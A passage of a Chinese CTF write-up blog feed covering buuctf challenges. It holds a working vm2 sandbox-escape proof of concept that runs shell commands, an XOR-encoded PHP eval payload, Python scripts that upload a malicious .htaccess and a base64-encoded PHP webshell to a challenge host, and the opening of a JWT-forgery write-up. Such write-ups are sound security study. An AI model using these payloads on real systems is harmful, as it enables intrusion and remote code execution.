class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error at vm.js:1:1 at Script.runInContext (vm.js:131:20) at VM.run (&#x2F;app&#x2F;node_modules&#x2F;vm2&#x2F;lib&#x2F;main.js:219:62) at &#x2F;app&#x2F;server.js:51:33 at Layer.handle [as handle_request] (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5) at next (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:137:13) at Route.dispatch (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:112:3) at Layer.handle [as handle_request] (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5) at &#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:281:22 at Function.process_params (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:335:12)</span><br></pre></td></tr></table></figure><p><a href="https://github.com/patriksimek/vm2/issues/225">vm2 逃逸 poc</a></p><p><a href="https://lequ7.com/guan-yu-javascriptnodejs-sha-he-tao-yi-fen-xi.html">关于javascript:nodejs-沙盒逃逸分析</a></p><p><a href="https://www.anquanke.com/post/id/207291?from=timeline">vm2沙箱逃逸分析</a></p><p>node.js 看不太懂欸……</p><blockquote><p>在沙盒环境下通过原型链的形式能获取全局的 Function，并通过它来执行代码？</p></blockquote><p>通过js神奇的拼接套poc🤣</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`prototyp`</span>&#125;</span>e`</span>&#125;</span>`</span>][<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return proc`</span>&#125;</span>ess`</span>&#125;</span>`</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">``</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> e[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>](<span class="function">()=&gt;</span>&#123;&#125;).mainModule[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`requir`</span>&#125;</span>e`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">`cat /flag`</span>).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><p>或者……当对象的方法或者属性名关键字被过滤的情况下可以利用数组调用的方式绕过关键字的限制：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?code[]=(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">&#125;<span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> e.get_process(<span class="function">()=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;cat /flag&quot;</span>).toString();</span><br><span class="line">&#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><img src="\images\HFCTF2020-JustEscape\image-20210822195916591.png" alt="image-20210822195916591" style="zoom:67%;"><p><a href="https://blog.csdn.net/sopromeo/article/details/108629520">https://blog.csdn.net/sopromeo/article/details/108629520</a></p><p><a href="%5Bhttps://0xgeekcat.github.io/%E5%AD%A6%E4%B9%A0Node-js-VM2-sandbox-escapse.html%5D(https://0xgeekcat.github.io/%E5%AD%A6%E4%B9%A0Node-js-VM2-sandbox-escapse.html)">学习NODE.JS VM2 SANDBOX ESCAPSE</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;nodejs    vm2 沙箱逃逸？&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>SUCTF-2019-EasyWeb</title>
    <link href="http://example.com/2021/08/22/SUCTF-2019-EasyWeb/"/>
    <id>http://example.com/2021/08/22/SUCTF-2019-EasyWeb/</id>
    <published>2021-08-22T06:36:29.713Z</published>
    <updated>2021-08-23T08:05:36.034Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>绕过与文件上传</p><a id="more"></a></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">&quot;upload/tmp_&quot;</span>.md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,$extension)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        $path= $userdir.<span class="string">&quot;/&quot;</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一个函数，一个eval</p><h4><span id="第一层">第一层</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>长度不能超过18</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br></pre></td></tr></table></figure><p>正则匹配</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br></pre></td></tr></table></figure><p>使用的字符不能超过12种</p><p>首先正则，可以看到大部分可见字符都过滤掉了，基本上就是使用异或、取反</p><p>取反需要<code>~</code>，但此符号被过滤掉了，与字串相同长度的<code>%ff</code>异或相当于取反</p><blockquote><p><a href="https://blog.csdn.net/qq_45521281/article/details/105656737">https://blog.csdn.net/qq_45521281/article/details/105656737</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br></pre></td></tr></table></figure><p>这个方法似乎非常的极限，暂时找不到更好的……disable function很多……</p><p>getflag：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">&quot;upload/tmp_&quot;</span>.md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,$extension)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        $path= $userdir.<span class="string">&quot;/&quot;</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件名匹配<code>ph</code>，文件内容匹配<code>&lt;?</code>，判断是否为图片，通过后输出存放路径</p><h4><span id="第二层">第二层</span></h4><p>第一点：exif_imagetype()读取一个图像的第一个字节并检查其签名</p><blockquote><p>1、在内容前面增加GIF98a等标志</p><p>2、在文件开头增加\xff\xd8等标志</p><p>3、&gt;使用了xbm格式，X Bit Map，来绕过图片检测</p><p>​      &gt;一个XMB图片文件通常如下：#define width 1337 #define height 1337 static char test_bits[] = { };</p></blockquote><p>第二点：文件名绕过</p><blockquote><p>.user.ini需要同文件夹下的php文件</p><p>这里选用.htaccess</p></blockquote><p>注意，<code>.htaccess</code>文件需要格式符合，否则会500异常；因此选用xbm绕过，此文件头会被认为是注释</p><p>第三点：文件内容绕过</p><blockquote><p>脚本编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_flag zend.multibyte 1 启用编码</span><br><span class="line">php_value zend.script_encoding &#39;UTF-8&#39; 设置编码</span><br><span class="line">php_value auto_append_file 所有文件底部包含</span><br></pre></td></tr></table></figure></blockquote><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%A0%B8%BA%AB^%ff%ff%ff%ff&#125;&#123;%A0&#125;();&amp;%ff&#x3D;get_the_flag</span><br></pre></td></tr></table></figure><p>利用python脚本进行文件提交：</p><p><strong>注意换行！</strong></p><p>.htaccess</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">shell =<span class="string">&quot;AddType application/x-httpd-php .aaa \nphp_flag display_errors on \nphp_flag zend.multibyte 1 \nphp_value zend.script_encoding &#x27;UTF-8&#x27; \nphp_value auto_append_file &#x27;php://filter/convert.base64-decode/resource=1.aaa&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;\n#define  counter_width 40 \n#define  counter_height 10&quot;</span></span><br><span class="line"><span class="comment">#   GIF8!</span></span><br><span class="line"><span class="comment">#   \xff\xd8</span></span><br><span class="line"><span class="comment">#   #define  counter_width 40 \n#define  counter_height 10</span></span><br><span class="line"></span><br><span class="line">con = prefix + <span class="string">&quot;\n&quot;</span> + shell</span><br><span class="line">con = con.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://2e82df58-e85e-48ab-833b-22a31a8f041d.node4.buuoj.cn:81/?_=$&#123;%ff%ff%ff%ff^%A0%B8%BA%AB&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0&#x27;</span>&#125;</span><br><span class="line">files = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;.htaccess&#x27;</span>, con, <span class="string">&#x27;image/x-xbitmap&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url=url, headers=headers, files=files)</span><br><span class="line"></span><br><span class="line">res = response.text</span><br><span class="line">print(res)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>AddType application/x-httpd-php .aaa     后缀.aaa解析为php</p><p>auto_append_file ‘php://filter/convert.base64-decode/resource=1.aaa’    <strong>包含文件可以用协议处理数据流</strong></p></blockquote><p>编码设置太麻烦了，学习了用协议读入……</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding : utf-8</span></span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> partial</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">shell = <span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydvayddKSA/Pg==&quot;</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;GIF8!&quot;</span></span><br><span class="line"><span class="comment">#   GIF8!</span></span><br><span class="line"><span class="comment">#   \xff\xd8</span></span><br><span class="line"><span class="comment">#   #define  counter_width 40 \n#define  counter_height 10</span></span><br><span class="line"></span><br><span class="line">con = prefix + <span class="string">&quot;\n&quot;</span> + shell</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://2e82df58-e85e-48ab-833b-22a31a8f041d.node4.buuoj.cn:81/?_=$&#123;%ff%ff%ff%ff^%A0%B8%BA%AB&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0&#x27;</span>&#125;</span><br><span class="line">files = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;1.aaa&#x27;</span>, con, <span class="string">&#x27;image/png&#x27;</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url=url, headers=headers, files=files)</span><br><span class="line"></span><br><span class="line">res = response.text</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><h4><span id="第三层">第三层</span></h4><p>获取shell后，发现不能跨目录与命令执行……又到了恐怖的绕disable function 时间……</p><p>……</p><p><img src="/images/SUCTF-2019-EasyWeb/image-20210822151133816.png" alt="image-20210822151133816"></p><p><img src="/images/SUCTF-2019-EasyWeb/image-20210822151143300.png" alt="image-20210822151143300"></p><p><img src="/images/SUCTF-2019-EasyWeb/image-20210822151154733.png" alt="image-20210822151154733"></p><p><strong>蚁剑还是强啊！</strong></p><p>参考文章:<br><a href="https://blog.csdn.net/mochu7777777/article/details/104631142">浅谈PHP代码执行中出现过滤限制的绕过执行方法</a></p><p><a href="https://xz.aliyun.com/t/6042#toc-26">https://xz.aliyun.com/t/6042#toc-26</a></p><p><a href="https://www.freebuf.com/column/212817.html">一道疯狂bypass的题目</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;绕过与文件上传&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>HFCTF2020-EasyLogin</title>
    <link href="http://example.com/2021/08/18/HFCTF2020-EasyLogin/"/>
    <id>http://example.com/2021/08/18/HFCTF2020-EasyLogin/</id>
    <published>2021-08-18T08:29:22.741Z</published>
    <updated>2021-08-31T03:41:27.228Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>jwt 伪造，一下写好长……em，圆满</p><a id="more"></a></blockquote><div class="toc" tabindex="1"><!-- toc --><ul><li><a href="#%E6%8E%A2%E7%B4%A2">探索</a></li><li><a href="#%E5%8F%8D%E6%8E%A8">反推</a><ul><li><a href="#koa-%E6%A1%86%E6%9E%B6">koa 框架</a></li><li><a href="#controller"><strong>controller</strong>？</a><ul><li><a href="#mvc-%E7%9A%84-c-controller"><strong>MVC 的 C – controller</strong></a></li><li><a href="#rest-api"><strong>REST api</strong></a></li></ul></li><li><a href="#%E7%BB%8F%E9%AA%8C">经验</a></li></ul></li><li><a href="#%E4%BC%AA%E9%80%A0">伪造</a><ul><li><a href="#%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E7%9A%84-jwt-%E5%BA%93">易受攻击的 JWT 库</a></li><li><a href="#%E7%BB%95%E8%BF%87%E4%B8%8E%E5%85%B6%E5%8E%9F%E7%90%86">绕过与其原理</a></li></ul></li></ul><!-- tocstop --></div><br><h4><span id="探索">探索</span></h4><p>有/login /register /home 页面</p><p>在/home页面getflag，提示<strong>permission denied</strong> ，估计是要admin权限，admin账号无法注册</p><p><strong>引入的 js：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  或许该用 koa-static 来处理静态文件</span></span><br><span class="line"><span class="comment"> *  路径该怎么配置？不管了先填个根目录XD</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> username = $(<span class="string">&quot;#username&quot;</span>).val();</span><br><span class="line">    <span class="keyword">const</span> password = $(<span class="string">&quot;#password&quot;</span>).val();</span><br><span class="line">    <span class="keyword">const</span> token = sessionStorage.getItem(<span class="string">&quot;token&quot;</span>);</span><br><span class="line">    $.post(<span class="string">&quot;/api/login&quot;</span>, &#123;username, password, <span class="attr">authorization</span>:token&#125;)</span><br><span class="line">        .done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">const</span> &#123;status&#125; = data;</span><br><span class="line">            <span class="function"><span class="title">if</span>(<span class="params">status</span>)</span> &#123;</span><br><span class="line">                <span class="built_in">document</span>.location = <span class="string">&quot;/home&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .fail(<span class="function"><span class="keyword">function</span>(<span class="params">xhr, textStatus, errorThrown</span>) </span>&#123;</span><br><span class="line">            alert(xhr.responseJSON.message);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> username = $(<span class="string">&quot;#username&quot;</span>).val();</span><br><span class="line">    <span class="keyword">const</span> password = $(<span class="string">&quot;#password&quot;</span>).val();</span><br><span class="line">    $.post(<span class="string">&quot;/api/register&quot;</span>, &#123;username, password&#125;)</span><br><span class="line">        .done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; token &#125; = data;</span><br><span class="line">            sessionStorage.setItem(<span class="string">&#x27;token&#x27;</span>, token);</span><br><span class="line">            <span class="built_in">document</span>.location = <span class="string">&quot;/login&quot;</span>;</span><br><span class="line">        &#125;)</span><br><span class="line">        .fail(<span class="function"><span class="keyword">function</span>(<span class="params">xhr, textStatus, errorThrown</span>) </span>&#123;</span><br><span class="line">            alert(xhr.responseJSON.message);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.get(<span class="string">&#x27;/api/logout&#x27;</span>).done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;status&#125; = data;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">status</span>)</span> &#123;</span><br><span class="line">            <span class="built_in">document</span>.location = <span class="string">&#x27;/login&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.get(<span class="string">&#x27;/api/flag&#x27;</span>).done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;flag&#125; = data;</span><br><span class="line">        $(<span class="string">&quot;#username&quot;</span>).val(flag);</span><br><span class="line">    &#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params">xhr, textStatus, errorThrown</span>) </span>&#123;</span><br><span class="line">        alert(xhr.responseJSON.message);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>抓包的时候发现很奇怪，似乎并没有账户数据。注册时会给一个授权(<strong>authorization</strong>)，base64解一下发现是 <strong>jwt</strong>，整个登录流程全靠jwt的验证，所以需要对jwt有所了解。</p><img src="/images/HFCTF2020-EasyLogin/image-20210818215957097.png" alt="image-20210818215957097" style="zoom:80%;"><p><img src="/images/HFCTF2020-EasyLogin/image-20210818220627087.png" alt="image-20210818220627087"></p><blockquote><p>登陆成功后会返回一个base64加密后的用户数据和一个签名</p></blockquote><blockquote><p>1、前后端分离，即服务端和前端只关心自己的事。</p><p>2、使用 <strong>jwt</strong> 作为 <strong>api</strong> 认证凭证</p><p>3、服务端仅保存加密用的<strong>secret</strong></p></blockquote><blockquote><p><a href="https://www.freebuf.com/articles/web/181261.html">深入了解Json Web Token之实战篇 